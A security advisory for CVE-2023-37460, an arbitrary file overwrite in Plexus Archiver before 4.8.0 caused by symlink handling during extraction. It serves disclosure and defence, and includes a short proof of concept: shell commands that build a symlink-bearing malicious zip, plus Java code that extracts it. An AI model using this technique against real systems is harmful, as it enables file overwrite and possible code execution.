---
description: CVE-2023-37460, High, Plexus Archiver arbitrary file overwrite
title: Plexus Archiver arbitrary file overwrite
date_published: "2023-07-26"
last_updated: "2023-07-26"
xray_id: XRAY-526292
vul_id: CVE-2023-37460
cvss: 8.1
severity: high
discovered_by: Uriya Yavnieli
type: vulnerability
---

## Summary

Using AbstractUnArchiver for extracting an archive might lead to an arbitrary file creation and possibly remote code execution

## Component

org.codehaus.plexus:plexus-archiver

## Affected versions

(,4.8.0)

## Description

Plexis Archiver is a collection of **Plexus** components to create archives or extract archives to a directory with a unified `Archiver`/`UnArchiver` API. Prior to version 4.8.0, using AbstractUnArchiver for extracting an archive might lead to an arbitrary file creation and possibly remote code execution. When extracting an archive with an entry that already exists in the destination directory as a symbolic link whose target does not exist - the `resolveFile()` function will return the symlink's source instead of its target, which will pass the verification that ensures the file will not be extracted outside of the destination directory. Later `Files.newOutputStream()`, that follows symlinks by default, will actually write the entry's content to the symlink's target. Whoever uses **plexus** archiver to extract an untrusted archive is vulnerable to an arbitrary file creation and possibly remote code execution. Version 4.8.0 contains a patch for this issue.

## PoC

Creating the "malicious" archive -

```
$ ln -s /tmp/target entry1
$ echo -ne “content” > entry2
$ zip  --symlinks archive.zip entry1 entry2
$ sed -i 's/entry2/entry1/' archive.zip
```



Vulnerable code snippet -

```
package com.example;

import java.io.File;
import org.codehaus.plexus.archiver.zip.ZipUnArchiver;

public class App 
{
    public static void main( String[] args )
    {
        ZipUnArchiver unArchiver = new ZipUnArchiver(new File("archive.zip"));
        unArchiver.setDestDirectory(new File("/tmp/extracted_files"));
        unArchiver.extract();        
    }
}
```



## Vulnerability Mitigations

No mitigations are supplied for this issue

## References

https://github.com/codehaus-plexus/plexus-archiver/security/advisories/GHSA-wh3p-fphp-9h2m
